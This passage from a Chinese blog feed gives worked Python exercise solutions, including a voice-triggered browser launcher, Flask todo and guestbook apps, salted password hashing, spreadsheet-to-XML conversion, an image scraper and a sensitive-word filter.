    <content type="text"><![CDATA[题目使用 Python 实现：对着电脑吼一声,自动打开浏览器中的默认网站。 例如，对着笔记本电脑吼一声“百度”，浏览器自动打开百度首页。关键字：Speech to Text 参考思路： 获取电脑录音–&gt;WAV文件 python record wav 录音文件–&gt;文本 STT: Speech to Text STT API Google API 文本–&gt;电脑命令 分析根据参考思路，用pyaudio去录音，传给腾讯AI开放平台的语音识别接口，需要自行注册，根据返回的文本去执行相应的命令，这里用webbrowser去操作浏览器。 pip install webbrowser pyaudio 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119import osimport hashlibimport pyaudioimport wavefrom array import arrayimport apiutilimport webbrowserFILE_NAME = "tmp.wav"#录音def record_sound(): FORMAT = pyaudio.paInt16 CHANNELS = 1 RATE = 16000 CHUNK = 1024 RECORD_SECONDS = 3 #按照16KHz，单声道，16位最多采集声音3秒 audio = pyaudio.PyAudio() stream = audio.open( format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK) print('开始录音') #过滤背景噪音 frames = [] for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)): data = stream.read(CHUNK) data_chunk = array('h', data) vol = max(data_chunk) #只录入大于2000 的声音。 if (vol &gt;= 2000): frames.append(data) print('录音结束') #结束录音 stream.stop_stream() stream.close() audio.terminate() #将结果写入到wav文件 wavfile = wave.open(FILE_NAME, 'wb') wavfile.setnchannels(CHANNELS) wavfile.setsampwidth(audio.get_sample_size(FORMAT)) wavfile.setframerate(RATE) wavfile.writeframes(b''.join(frames)) #append frames recorded to file wavfile.close()#调用腾讯AI接口，将声音转化成文字。#感谢daimon99提供基于python3的aiplatsdk https://github.com/daimon99/py-aiplat-py3def soundTotext(): app_key = '申请的Key' app_id = '申请的Id' seq = 0 for_mat = 2 rate = 16000 bits = 16 cont_res = 0 once_size = 41000 file_path = FILE_NAME #计算音频MD5 with open(file_path, 'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() speech_id = str(hash).upper() #读取音频内容，每次41000字节 f = open(file_path, 'rb') file_size = os.path.getsize(file_path) try: while True: chunk = f.read(once_size) if not chunk: break else: chunk_size = len(chunk) if (seq + chunk_size) == file_size: end = 1 else: end = 0 #初始化AIPlat接口 ai_obj = apiutil.AiPlat(app_id, app_key) #调用语音识别-流式版(WeChat AI),传入参数 rsp = ai_obj.getAaiWxAsrs(chunk, speech_id, end, for_mat, rate, bits, seq, chunk_size, cont_res) seq += chunk_size if rsp['ret'] == 0: return rsp['data']['speech_text'] else: print("调用腾讯API失败") return None finally: f.close()#执行命令def command(text): if text is None: print("未识别到，请重试") elif '百度' in text: webbrowser.open("https://www.baidu.com") else: print(text)if __name__ == '__main__': record_sound() text = soundTotext() command(text) 参考 https://stackoverflow.com/questions/892199/detect-record-audio-in-python https://github.com/daimon99/py-aiplat-py3 https://ai.qq.com/doc/aaiasr.shtml https://docs.python.org/3/library/webbrowser.html]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0024]]></title>
    <url>%2F2018%2F06%2F15%2Fpython-exercise-0024%2F</url>
    <content type="text"><![CDATA[题目第 0024 题： 使用 Python 的 Web 框架，做一个 Web 版本 TodoList 应用。 分析这种综合项目涉及的知识点较多,这里我们用Flask1.0和flask-sqlalchemy实现其逻辑，数据库使用SQLite3,用materialize样式美化我们的页面，jQuery优化用户体验。主要修改自李辉的Flask实践：待办事项,去除添加分类功能，只保留核心todo内容。 pip install flask flask-salalchemy 代码 结构 templates/ —–&gt; 模板 index.html static/ —–&gt; 静态页面 css js app.py —–&gt; flask 代码 todo.db —–&gt; sqlite3数据库 核心代码app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import osfrom flask import Flaskfrom flask import render_template, redirect, url_for, requestfrom flask_sqlalchemy import SQLAlchemyapp = Flask(__name__)#配置数据库信息DATABASE = "todo.db"basedir = os.path.abspath(os.path.dirname(__file__))app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + os.path.join( basedir, DATABASE)app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = Falsedb = SQLAlchemy(app)#数据库结构项class Item(db.Model): id = db.Column(db.Integer, primary_key=True) body = db.Column(db.Text) category_id = db.Column( db.Integer, db.ForeignKey('category.id'), default=1)#构建数据库结构 类class Category(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(64)) #构造项与类的关系 items = db.relationship('Item', backref='category')#初始化数据库，并添加测试数据def init_db(): """Insert default categories and demo items. """ db.create_all() todo = Category(name=u'待完成') done = Category(name=u'已完成') item = Item(body=u'看一小时《战争与和平》') item2 = Item(body=u'浇花', category=todo) item3 = Item(body=u'收快递', category=done) db.session.add_all([todo, done, item, item2, item3]) db.session.commit()#首页@app.route('/', methods=['GET', 'POST'])def index(): #第一次运行时初始化数据库 if not os.path.exists(DATABASE): init_db() if request.method == 'POST': body = request.form.get('item') category_id = request.form.get('category') category = Category.query.get_or_404(category_id) item = Item(body=body, category=category) db.session.add(item) db.session.commit() return redirect(url_for('category', id=category_id)) return redirect(url_for('category', id=1))#分类页@app.route('/category/&lt;int:id&gt;')def category(id): category = Category.query.get_or_404(id) categories = Category.query.all() items = category.items return render_template( 'index.html', items=items, categories=categories, category_now=category)#编辑某项@app.route('/edit-item/&lt;int:id&gt;', methods=['GET', 'POST'])def edit_item(id): item = Item.query.get_or_404(id) category = item.category item.body = request.form.get('body') db.session.add(item) db.session.commit() return redirect(url_for('category', id=category.id))#添加到已完成@app.route('/done/&lt;int:id&gt;', methods=['GET', 'POST'])def done(id): item = Item.query.get_or_404(id) category = item.category done_category = Category.query.get_or_404(2) done_item = Item(body=item.body, category=done_category) db.session.add(done_item) db.session.delete(item) db.session.commit() return redirect(url_for('category', id=category.id))#删除某项@app.route('/delete-item/&lt;int:id&gt;')def del_item(id): item = Item.query.get_or_404(id) category = item.category if item is None: return redirect(url_for('category', id=1)) db.session.delete(item) db.session.commit() return redirect(url_for('category', id=category.id))if __name__ == '__main__': app.run(debug=True) 完整代码参见这里 效果 参考 https://github.com/helloflask/todo]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0023]]></title>
    <url>%2F2018%2F06%2F14%2Fpython-exercise-0023%2F</url>
    <content type="text"><![CDATA[题目使用 Python 的 Web 框架，做一个 Web 版本 留言簿 应用。 阅读资料：Python 有哪些 Web 框架 分析常见的知名web框架有Django,Flask,Tornado,Bottle等，这里我们用Flask1.0+SQLite3实现其功能，用Pure样式美化我们的页面。主要参考Yixiaohan的flask-guestbook。 pip install flask 代码 结构 templates/ —–&gt; 模板 index.html static/ —–&gt; 静态页面 pure-min.css app.py —–&gt; flask 代码 guestbook.db —–&gt; sqlite3数据库 核心代码app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import sqlite3, osfrom datetime import datetimefrom flask import Flaskfrom flask import render_template, request, redirectfrom flask import gDATABASE = "guestbook.db"app = Flask(__name__)#绑定数据库链接def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect(DATABASE) return db@app.teardown_appcontextdef close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close()#第一次初始化数据库结构def init_db(): db = get_db() db.cursor().execute("""CREATE TABLE GUESTBOOK( USERNAME TEXT NOT NULL, COMMENT TEXT NOT NULL, CREATEAT TEXT NOT NULL); """) db.commit()#加载留言def load_data(): cur = get_db().execute("SELECT * from GUESTBOOK") rv = cur.fetchall() cur.close() return rv#保存留言def save_data(name, comment, create_at): db = get_db() cur = db.cursor().execute( "INSERT INTO GUESTBOOK (USERNAME,COMMENT,CREATEAT) VALUES (?,?,?)", (name, comment, create_at)) cur.close() db.commit()#响应主页@app.route('/')def index(): #第一次运行时初始化数据库 if not os.path.exists(DATABASE): init_db() #获取留言数据 greeting_list = load_data() #渲染html页面 return render_template('index.html', greeting_list=greeting_list)#得到POST方法提交的表单数据。@app.route('/post', methods=['POST'])def post(): name = request.form['name'] comment = request.form['comment'] create_at = datetime.now() save_data(name, comment, create_at) return redirect('/')if __name__ == '__main__': app.run('127.0.0.1', port='5000', debug=True) 完整代码参见这里 效果]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0022]]></title>
    <url>%2F2018%2F06%2F14%2Fpython-exercise-0022%2F</url>
    <content type="text"><![CDATA[题目iPhone 6、iPhone 6 Plus 早已上市开卖。请查看你写得 第 0005 题的代码是否可以复用。 分析0005题，的代码完全可以复用，只需要改动MAX_RESIZE为(750, 1334)(iPhone6的分辨率)。 代码1234567891011121314151617181920212223242526272829303132import osfrom PIL import Imagedef resize(img_dir, MAX_RESIZE, out_dir): try: for file in os.listdir(img_dir): #读取文件 img_file = os.path.join(img_dir, file) img = Image.open(img_file) #调整大小 out = img.resize(MAX_RESIZE) #如果out文件夹不存在则新建一个 if not os.path.exists(out_dir): os.mkdir(out_dir) #保存结果 out_img = os.path.join(out_dir, file) out.save(out_img) except Exception as e: print("操作失败！", e)if __name__ == '__main__': img_dir = 'img' out_dir = 'out' MAX_RESIZE = (750, 1334) resize(img_dir, MAX_RESIZE, out_dir) 参考 https://xiaotaoist.github.io/2018/05/29/python-exercise-0005/]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0021]]></title>
    <url>%2F2018%2F06%2F13%2Fpython-exercise-0021%2F</url>
    <content type="text"><![CDATA[题目通常，登陆某个网站或者 APP，需要使用用户名和密码。密码是如何加密后存储起来的呢？请使用 Python 对密码加密。 阅读资料 用户密码的存储与 Python 示例 阅读资料 Hashing Strings with Python 阅读资料 Python’s safest method to store and retrieve passwords from a database 分析用户密码的存储与Python示例中，已经给出了解答，想要安全的存储密码至少需要把密码拼接随机salt后，存储sha256计算后的密文到数据库，这里我们存到sqlite3数据库中，做个示例。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import osimport hashlibimport sqlite3import binascii#加密def encrypt_passwd(passwd, salt=None): #把8位随机内容，转成16进制输出作为salt if salt is None: salt = binascii.b2a_hex(os.urandom(8)) passwd = passwd.encode('utf-8') #用hashlib自带函数，sha256，迭代10000次，生成哈希值 result = hashlib.pbkdf2_hmac('sha256', passwd, salt, 10000) #返回salt和密文 return salt + binascii.b2a_hex(result)#验证def verify_passwd(salthash, passwd): if isinstance(salthash, str): salthash = salthash.encode('utf-8') #验证是否一致 return encrypt_passwd(passwd, salt=salthash[:16]) == salthash#初始化sqllite3数据库def init_db(): conn = sqlite3.connect("user.db") c = conn.cursor() c.execute("DROP TABLE IF EXISTS USER;") sql = """CREATE TABLE USER( ID INTEGER PRIMARY KEY autoincrement, USERNAME TEXT NOT NULL, PASSWORD TEXT NOT NULL); """ c.execute(sql) conn.commit() return conn#注册新用户def register(conn, username, passwd): c = conn.cursor() #加密 passwd = encrypt_passwd(passwd).decode('utf-8') #写入到数据库 c.execute("INSERT INTO USER (ID,USERNAME,PASSWORD) VALUES (NULL,?,?)", (username, passwd)) conn.commit() print("注册%s成功！" % (username))#登录def sgin(conn, username, passwd): c = conn.cursor() cur = c.execute("SELECT PASSWORD from USER where USERNAME=:name", &#123;"name": username&#125;) #获取密码 pwd = cur.fetchone() #验证用户是否存在，并验证密码 if pwd and verify_passwd(pwd[0], passwd): print('登录%s成功！' % (username)) return True else: print("登录%s失败" % (username)) return Falseif __name__ == '__main__': c = init_db() register(c, "zhang3", "123456") register(c, "li4", "212") sgin(c, "zhang3", "1234") sgin(c, "li", "12") while True: user = input("user:") passwd = input("passwd:") if sgin(c, user, passwd): break c.close() 扩展还有一个极端的选择是系统完全不接触密码，用户的身份认证转交受信任的第三方来处理。例如 OpenID 这样的解决方案。系统向受信任的第三方求证用户身份的合法性，用户通过密码向第三方证明自己的身份。比如腾讯开放平台 参考 http://zhuoqiang.me/password-storage-and-python-example.html http://www.runoob.com/sqlite/sqlite-intro.html https://blog.csdn.net/Rozol/article/details/72566661 https://paragonie.com/blog/2016/02/how-safely-store-password-in-2016#python]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0020]]></title>
    <url>%2F2018%2F06%2F12%2Fpython-exercise-0020%2F</url>
    <content type="text"><![CDATA[题目第 0020 题： 登陆中国联通网上营业厅 后选择「自助服务」 --&gt; 「详单查询」，然后选择你要查询的时间段，点击「查询」按钮，查询结果页面的最下方，点击「导出」，就会生成类似于 2014年10月01日～2014年10月31日通话详单.xls 文件。写代码，对每月通话时间做个统计。 我们可以看到表格内容类似如下： 分析我们先用xlrd读取表格中通话时长，呼叫类型两列数据,再用re去提取通话时长的数据，最后进行累加统计即可。 代码12345678910111213141516171819202122232425262728293031323334353637import reimport xlrd#统计时长def collect_times(xlsname): #读取第一个表格数据 xls = xlrd.open_workbook(xlsname) sheet = xls.sheet_by_index(0) sum_time = 0 caller_sum = 0 #去掉表头 for n in range(1, sheet.nrows): #读取通话时长与呼叫类型两列数据 call_time, call_type = sheet.row_values(n)[3:5] #通过正则，得到时间，如9分23秒返回(9,23) Min, Sec = re.match(r'(\d*?)[分]?(\d+)秒', call_time).groups() #转化成秒 if Min == '': Min = '0' times = int(Min) * 60 + int(Sec) #统计主叫时间 if call_type == "主叫": caller_sum += times sum_time += times #打印统计结果 print("本月主叫通话时间：%s分%s秒" % (divmod(caller_sum, 60))) print("本月被叫通话时间：%s分%s秒" % (divmod(sum_time - caller_sum, 60))) print("本月通话时间总计：%s分%s秒" % (divmod(sum_time, 60)))if __name__ == "__main__": data = collect_times('2018年06月语音通信.xls') 参考 http://www.runoob.com/python/python-reg-expressions.html]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0019]]></title>
    <url>%2F2018%2F06%2F11%2Fpython-exercise-0019%2F</url>
    <content type="text"><![CDATA[题目将 第 0016 题中的 numbers.xls 文件中的内容写到 numbers.xml 文件中，如下所示： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;root&gt; &lt;numbers&gt; &lt;!-- 数字信息 --&gt; [ [1, 82, 65535], [20, 90, 13], [26, 809, 1024] ] &lt;/numbers&gt; &lt;/root&gt; 分析和0017题,0018题，都是一样的，这次用pandas封装好的read_excel去读取表格内容，建立xml依旧用lxml。 pip install pandas xlrd lxml 代码12345678910111213141516171819202122232425262728293031323334353637383940import pandas as pdfrom lxml import etree#读取xls,返回所需要样式的字符串def read_xls(xlsname): df = pd.read_excel(xlsname, header=None) d = df.to_dict(orient='split')['data'] return "\n\t[\n\t\t&#123;&#125;,\n\t\t&#123;&#125;,\n\t\t&#123;&#125;\n\t]\n".format(d[0], d[1], d[2])#写入到xmldef write_xml(xmlname, data, comment): #建立root根节点 root = etree.Element('root') #添加注释 comm = etree.Comment(comment) root.append(comm) #添加一个子节点 child = etree.SubElement(root, xmlname) #添加文字 child.text = data #生成xml树对象 tree = etree.ElementTree(root) #写入到表格 tree.write( xmlname + '.xml', pretty_print=True, xml_declaration=True, encoding='utf-8')if __name__ == "__main__": comment = '数字信息' data = read_xls('numbers.xls') write_xml('numbers', data, comment) 参考 http://www.runoob.com/python/att-string-format.html https://blog.csdn.net/m0_37804518/article/details/78444110]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0018]]></title>
    <url>%2F2018%2F06%2F11%2Fpython-exercise-0018%2F</url>
    <content type="text"><![CDATA[题目将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示： &lt;?xmlversion=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;root&gt; &lt;cities&gt; &lt;!-- 城市信息 --&gt; { &quot;1&quot; : &quot;上海&quot;, &quot;2&quot; : &quot;北京&quot;, &quot;3&quot; : &quot;成都&quot; } &lt;/cities&gt; &lt;/root&gt; 分析和0017题一样，这次我们用lxml去操作xml对象,它比自带的xml具有更好的扩展性，还支持美化输出。 pip install lxml xlrd 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344import xlrdfrom lxml import etree#读取xlsdef read_xls(xlsname, sheetname): xls = xlrd.open_workbook(xlsname) sheet = xls.sheet_by_name(sheetname) data = &#123;&#125; for n in range(sheet.nrows): row_d = sheet.row_values(n) data[row_d[0]] = row_d[1] return data#写入到xmldef write_xml(xmlname, data, comment): #建立root根节点 root = etree.Element('root') #添加注释 comm = etree.Comment(comment) root.append(comm) #添加一个子节点city child = etree.SubElement(root, xmlname) #添加文字 child.text = str(data) #生成xml树对象 tree = etree.ElementTree(root) #写入到表格 tree.write( xmlname + '.xml', pretty_print=True, xml_declaration=True, encoding='utf-8')if __name__ == "__main__": comment = '城市信息' data = read_xls('city.xls', 'city') write_xml('city', data, comment) 参考 https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/processing-xml-in-python-with-element-tree.html https://stackoverflow.com/questions/47229309/what-are-the-differences-between-lxml-and-elementtree]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0017]]></title>
    <url>%2F2018%2F06%2F10%2Fpython-exercise-0017%2F</url>
    <content type="text"><![CDATA[题目将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;root&gt; &lt;students&gt; &lt;!-- 学生信息表 &quot;id&quot; : [名字, 数学, 语文, 英文] --&gt; { &quot;1&quot; : [&quot;张三&quot;, 150, 120, 100], &quot;2&quot; : [&quot;李四&quot;, 90, 99, 95], &quot;3&quot; : [&quot;王五&quot;, 60, 66, 68] } &lt;/students&gt; &lt;/root&gt; 分析先用xlrd读取xls表格里的数据，接着去按照指定格式写入到xml文件，这里我们用xml.dom.minidom去操作xml对象。 pip install xlrd 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import xml.dom.minidom as mdimport xlrd#读取xml内容到字典对象def read_xls(filename, sheetname): #打开student.xls xls = xlrd.open_workbook(filename) #读取student表 sheet = xls.sheet_by_name(sheetname) data = &#123;&#125; # 获取每行内容，以row为键，后面的列表为值，放到字典 for n in range(sheet.nrows): row_d = sheet.row_values(n) data[row_d[0]] = list(row_d[1:]) return data#按照题目要求美化字符串def pretty_str(dicts): text = "".join('&#123;\n') for k in sorted(dicts.keys()): lists = dicts[k] s = '\t\t\t"%s" : ["%s", %d, %d, %d],\n' % ( int(k), lists[0], int(lists[1]), int(lists[2]), int(lists[3])) text += s text += '\t\t&#125;' text = text[::-1].replace(',', '', 1)[::-1] #处理列表最后一项后面的， return text#写入到xmldef write_xml(xmlname, data, comment): #新建xml文档对象 xml = md.Document() #创建根节点 root = xml.createElement('root') #创建student节点 child = xml.createElement(xmlname) #先加入root节点 xml.appendChild(root) #在root节点下加入student节点 root.appendChild(child) #在student节点下添加注释 comment = xml.createComment(comment) child.appendChild(comment) #在student节点下写入文字内容 xmlcontent = xml.createTextNode(data) child.appendChild(xmlcontent) #美化后，保存到student.xml,"会被转义为＆quot，这里我们替换回来 with open(xmlname + '.xml', 'w') as f: f.write(xml.toprettyxml().replace('&amp;quot;', '"'))if __name__ == "__main__": comment = '学生信息表 "id" : [名字, 数学, 语文, 英文]' data = read_xls('student.xls', 'student') data = pretty_str(data) write_xml('student', data, comment) 参考 https://wenqiang-china.github.io/2016/05/13/python-opetating-excel/ https://www.cnblogs.com/liez/p/5406621.html https://maoao530.github.io/2016/08/10/python-show-me-the-code/]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0016]]></title>
    <url>%2F2018%2F06%2F09%2Fpython-exercise-0016%2F</url>
    <content type="text"><![CDATA[题目纯文本文件 numbers.txt, 里面的内容（包括方括号）如下所示： [ [1, 82, 65535], [20, 90, 13], [26, 809, 1024]]请将上述内容写到 numbers.xls 文件中，如下图所示： 分析和0014题,0015题一样，还是将指定内容写入Excel表格，这次我们分别用xlwt和pandas。 代码 xlwt 12345678910111213141516171819202122232425262728293031import jsonimport xlwtdef read(filename): with open(filename, 'r') as f: data = f.read() #格式化成json数据便于操作 return json.loads(data)def write(filename, data): #新建一个xls表格 workbook = xlwt.Workbook() #新建表：numbers sheet_name = workbook.add_sheet('numbers') row = 0 #行 #data 的内容[[1, 82, 65535], [20, 90, 13], [26, 809, 1024]] for row_d in data: col = 0 #列 for col_d in row_d: sheet_name.write(row, col, col_d) col += 1 row += 1 #保存成numbers.xls表 workbook.save(filename)if __name__ == '__main__': data = read('numbers.txt') write('numbers.xls', data) pandas 1234import pandas as pddf =pd.read_json('numbers.txt') df.to_excel('numbers.xls',header=None,index=False) 参考 https://blog.csdn.net/brucewong0516/article/details/79097909]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0015]]></title>
    <url>%2F2018%2F06%2F08%2Fpython-exercise-0015%2F</url>
    <content type="text"><![CDATA[题目纯文本文件 city.txt为城市信息, 里面的内容（包括花括号）如下所示： { “1” : “上海”, “2” : “北京”, “3” : “成都”}请将上述内容写到 city.xls 文件中，如下图所示： 分析和0014题一样也是将指定内容写入Excel表格，这次我们用xlwt库 pip install xlwt 代码12345678910111213141516171819202122232425262728293031import jsonimport xlwtdef read(filename): with open(filename, 'r') as f: data = f.read() #格式化成json数据便于操作 return json.loads(data)def write(filename, data): #新建一个xls表格 workbook = xlwt.Workbook() #添加一个city表 sheet_name = workbook.add_sheet('city') row = 0 #行 #data 的内容[('1', '上海'), ('2', '北京'), ('3', '成都')] for i, j in data.items(): col = 0 #列 sheet_name.write(row, col, i) sheet_name.write(row, col + 1, j) row += 1 #保存成city.xls表 workbook.save(filename)if __name__ == '__main__': data = read('city.txt') write('city.xls', data) 参考 https://www.jianshu.com/p/4e39444d5ebc https://blog.csdn.net/tongxinzhazha/article/details/78796952]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0014]]></title>
    <url>%2F2018%2F06%2F07%2Fpython-exercise-0014%2F</url>
    <content type="text"><![CDATA[题目纯文本文件 student.txt为学生信息, 里面的内容（包括花括号）如下所示： { “1”:[“张三”,150,120,100], “2”:[“李四”,90,99,95], “3”:[“王五”,60,66,68]}请将上述内容写到 student.xls 文件中，如下图所示： 阅读资料 腾讯游戏开发 XML 和 Excel 内容相互转换 分析txt的内容格式其实是字典格式，这里我们可以使用强大的数据处理库pandas实现字典到excel的直接转化。 pip install pandas xlwt 代码1234567import pandas as pd#按json格式读取内容，转化成pandas可以处理的DataFrame格式df = pd.read_json('student.txt',orient='index')#printf(df)#输出到student表格,表名student，忽略表头 0 1 2 3df.to_excel('student.xls',sheet_name='student',header=None) 参考 https://pandas.pydata.org/pandas-docs/stable/generated/pandas.read_json.html https://blog.csdn.net/tongxinzhazha/article/details/78796952]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0013]]></title>
    <url>%2F2018%2F06%2F06%2Fpython-exercise-0013%2F</url>
    <content type="text"><![CDATA[题目用 Python 写一个爬图片的程序，爬 这个链接里的日本妹子图片 :-) 分析打开链接，F12，我们看到图片链接还是比较有规律的，可以用Requests获取网页，接着用BeautifulSoup4或正则提取图片链接地址，然后下载到指定目录。 pip install requests bs4 lxml 代码 使用正则提取图片链接 12345678910111213141516171819202122232425262728293031323334353637import reimport requestsimport os#批量保存图片def save_img(urls,img_dir): #新建存储位置 if not os.path.exists(img_dir): os.mkdir(img_dir) for img_url in img_urls: try: #content的内容即为图片的二进制 img = requests.get(img_url,timeout=3).content imgname = img_url.split('/')[-1] filename = os.path.join(img_dir,imgname) print('downing ..... &#123;&#125;'.format(imgname) ) #保存图片 with open(filename,'wb') as f: f.write(img) except: print('downling &#123;&#125; fail !'.format(filename) )if __name__ == '__main__': img_dir = 'img' url = "http://tieba.baidu.com/p/2166231880" html = requests.get(url) #正则提取 图片链接 img_urls = re.findall(r'pic_type="0" class="BDE_Image" src="(.*?)"',html.text) save_img(img_urls,img_dir) 使用bs4库提取图片链接片段 12345678910111213import requestsfrom bs4 import BeautifulSoup as BSurl = "http://tieba.baidu.com/p/2166231880"html = requests.get(url)#创建BeautifulSoup对象soup = BS(html.text,'lxml')#提取所有class="BDE_Image"的 img 标签img = soup('img',&#123;'class':'BDE_Image'&#125;)urls = []for i in img: #里面的src属性的内容即为我们所需要的链接 urls.append(i['src']) 扩展当数据很多的时候，我们就需要考虑多线程/多进程/协程以提高运行速度。 threading多线程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import osimport reimport requestsimport threadingdef save_img(url,filename): try: #content的内容即为图片的二进制 img = requests.get(url,timeout=3).content print('downing ..... &#123;&#125;'.format(filename) ) #保存图片 with open(filename,'wb') as f: f.write(img) except Exception as e: print(e)def thread_get(urls,img_dir): if not os.path.exists(img_dir):os.mkdir(img_dir) l = [] for url in urls: imgname = url.split('/')[-1] filename = os.path.join(img_dir,imgname) #绑定线程 t = threading.Thread(target=save_img,args=(url,filename)) l.append(t) #启动线程 for i in l: i.start() #阻塞线程等待结束 for i in l: i.join()if __name__ == "__main__": img_dir = 'img' url = "http://tieba.baidu.com/p/2166231880" html = requests.get(url) #获取所有图片地址 img_urls = re.findall(r'img pic_type="0" class="BDE_Image" src="(.*?)"',html.text) thread_get(img_urls,img_dir) gevent协程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import osimport reimport requestsimport geventfrom gevent import pool,monkey#打补丁，使阻塞IO变成非阻塞monkey.patch_all()def save_img(url,filename): try: #content的内容即为图片的二进制 img = requests.get(url,timeout=3).content print('downing ..... &#123;&#125;'.format(filename) ) #保存图片 with open(filename,'wb') as f: f.write(img) except Exception as e: print(e)def gevent_get(urls,img_dir): if not os.path.exists(img_dir):os.mkdir(img_dir) jobs = [] for url in urls: imgname = url.split('/')[-1] filename = os.path.join(img_dir,imgname) #绑定协程对象 jobs.append(gevent.spawn(save_img,url,filename)) #启动 gevent.joinall(jobs) #阻塞 for i in jobs: i.join()if __name__ == "__main__": img_dir = 'img' url = "http://tieba.baidu.com/p/2166231880" html = requests.get(url) #获取所有图片地址 img_urls = re.findall(r'img pic_type="0" class="BDE_Image" src="(.*?)"',html.text) gevent_get(img_urls,img_dir) 参考 https://thief.one/2017/02/17/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%B8%A1%E5%B9%B4%E4%B8%8D%E9%B8%A1%E8%82%8B/ https://thief.one/2017/02/20/Python%E5%8D%8F%E7%A8%8B/ https://eastlakeside.gitbooks.io/interpy-zh/content/Coroutines/]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0012]]></title>
    <url>%2F2018%2F06%2F05%2Fpython-exercise-0012%2F</url>
    <content type="text"><![CDATA[题目敏感词文本文件 filtered_words.txt，里面的内容 和 0011题一样，当用户输入敏感词语，则用 星号 * 替换，例如当用户输入「北京是个好城市」，则变成「**是个好城市」。 分析思路和0011题一样，接着使用str.replace方法,将敏感词替换为*。 代码 普通版 12345678910111213with open('filtered_words.txt','r') as f: #读取内容到一个列表，并过滤每项中的'\n' text = ''.join(f.readlines()).strip('\n').split()while True: #读取输入 line = input("&gt; ") #循环替换一遍 for words in text: #根据敏感词长度打印*的长度 line = line.replace(words,len(words)*‘*’) print(line) 高效版，从Github上找一个DFA，BF算法实现的匹配过滤，由于python2写的，我们可以简单修改一下，去除编码部分的判断即可在Python3下正常使用。 123456789101112from wfgfw import DFAFilter#构造DFAFilter对象f = DFAFilter()#添加关键词f.parse('filtered_words.txt')while True: msg = input("&gt;") #过滤消息，默认返回(布尔值，过滤过的内容) _,out = f.filter(msg) print(out) 参考 https://github.com/dantezhu/wfgfw/blob/master/wfgfw/wfgfw.py https://xiaotaoist.github.io/2018/06/04/python-exercise-0011]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0011]]></title>
    <url>%2F2018%2F06%2F04%2Fpython-exercise-0011%2F</url>
